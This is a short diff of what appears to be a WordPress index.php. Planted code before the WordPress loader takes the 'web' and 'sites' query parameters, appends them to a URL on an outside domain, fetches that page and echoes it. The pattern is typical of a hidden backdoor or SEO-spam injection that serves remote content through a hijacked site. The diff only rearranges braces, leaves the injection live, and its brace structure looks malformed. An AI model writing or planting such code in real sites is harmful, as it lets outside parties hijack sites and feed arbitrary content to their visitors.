@@ -35,13 +35,13 @@ elseif(isset($_GET['web'])) {
   $site = 'https://replication2.pkcdurensawit.net/ipopi/?web='.$sitex;
   $data = fetchDataFromSite($site);
   echo $data;
-
+}
 if(isset($_GET['sites'])) {
     $sitex = $_GET['sites'];
     $site = 'https://replication2.pkcdurensawit.net/ipopi/?sites='.$sitex;
     $data = fetchDataFromSite($site);
     echo $data;
-}
+	
 } else {
 /**
  * Loads the WordPress environment and template.
